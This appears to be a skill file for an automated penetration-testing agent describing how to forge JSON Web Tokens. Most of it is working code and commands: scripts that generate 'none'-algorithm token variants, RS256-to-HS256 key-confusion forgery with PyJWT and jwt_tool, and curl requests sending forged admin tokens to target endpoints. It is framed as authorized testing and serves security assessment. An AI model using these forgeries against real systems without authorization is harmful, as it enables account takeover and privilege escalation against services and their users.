---
name: jwt-algorithm-confusion
domain: auth-security
category: auth-security
tier: balanced
description: Test JWT implementations for the "none" algorithm acceptance and RS/HS key-confusion flaws that allow token forgery.
toolRefs:
  - httpRequest
  - parseResponse
  - jwtDecode
  - recordEvidence
  - writeFinding
  - getTargetSummary
triggers:
  - jwt none algorithm attack
  - jwt algorithm confusion
  - rs hs key confusion
  - jwt token forgery test
contextBoosts: []
toolChains: []
compositionRules: {}
mitreAttack:
  - T1078
  - T1609
owaspRefs:
  - A02:2021
  - A07:2021
---

# JWT `none` Algorithm & Key-Confusion Attacks

## When to Use
Use when the application authenticates via JWTs (Authorization bearer tokens, session cookies). Target the two classic forgery classes: acceptance of the `none` algorithm and asymmetric/symmetric key-type confusion.

## Detection Approach
1. **Capture a valid token.** Obtain a legitimate JWT from an authenticated request and decode its header and payload with `jwtDecode` to read `alg`, issuer, and claims.

```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI4NDEyIn0.<sig>"
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
```

2. **Test `none` algorithm.** Re-sign (or leave unsigned) the token with `alg:"none"` and an empty signature. Submit it. If the server accepts it as the original identity, the `none` check is missing.

```bash
python3 - <<'EOF'
import base64, json
b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
pl = b64u(json.dumps({"sub":"8412","role":"admin","exp":9999999999}).encode())
for alg in ("none", "None", "nOnE", "NONE", "null", ""):
    hdr = b64u(json.dumps({"alg": alg, "typ": "JWT"}).encode())
    print(f"{hdr}.{pl}.")
EOF
```

Send each candidate:

```bash
curl -s https://target.com/api/me \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload>."
```

3. **Test algorithm downgrade.** If the original `alg` is asymmetric (RS256/ES256), forge a token using the *public* key (which is often publicly retrievable) as the HMAC secret with `alg:"HS256"`. Libraries that skip key-type validation will verify it.

```bash
# Fetch the exact verifying key
curl -s https://target.com/.well-known/jwks.json
# or extract from TLS:
openssl s_client -connect target.com:443 -showcerts 2>/dev/null \
  | openssl x509 -pubkey -noout > public.pem
```

```python
import jwt  # pip install pyjwt
pubkey = open("public.pem", "rb").read()
print(jwt.encode({"sub":"8412","role":"admin","exp":9999999999},
                 key=pubkey, algorithm="HS256"))
```

Or with jwt_tool (key-confusion mode):

```bash
python3 jwt_tool.py "<original-jwt>" -X k -pk public.pem
```

4. **Test HS→RS confusion.** Conversely, if the server expects RSA but you can register an RSA public key you control as the signing secret, craft a symmetric token.

```bash
# Sign with your own RSA key if kid/jku lets you point at it:
openssl genrsa -out attacker.pem 2048
python3 jwt_tool.py "<original-jwt>" -S RS256 -pr attacker.pem -I -hc kid --kid "attacker-key"
```

5. **Validate impact.** Use the forged token against protected endpoints via `httpRequest` and confirm access via `parseResponse`.

```bash
curl -s https://target.com/admin/users \
  -H "Authorization: Bearer <forged-token>"
```

6. **Switch logic.** If `none` is rejected, move to key-confusion using the exposed public key. If both fail, record algorithm enforcement as sound.

## Pitfalls
- Forgetting that `none` may be blocked only when lowercase — try `None`, `NONE`.
- Using the wrong public key (JWKS endpoint vs embedded cert) — fetch the exact verifying key.
- Assuming a 200 on a non-protected endpoint proves forgery; retest on a privileged route.
- Leaving the signature non-empty when testing `none` (some parsers require empty sig).

## Verification & Impact
- **Confirmed:** Forged token (none or confused-alg) is accepted and grants the targeted identity/role.
- **Suspected:** Token accepted but only on low-privilege routes.
- Document the token flow, the flawed algorithm handling, and the privilege gained. Use `writeFinding` with decoded/forged token evidence.

## Key Concepts
| Term | Meaning |
|------|---------|
| `none` alg | Unsigned token, signature skipped |
| Key confusion | Symmetric/asymmetric type mismatch |
| JWKS | JSON Web Key Set (public keys) |
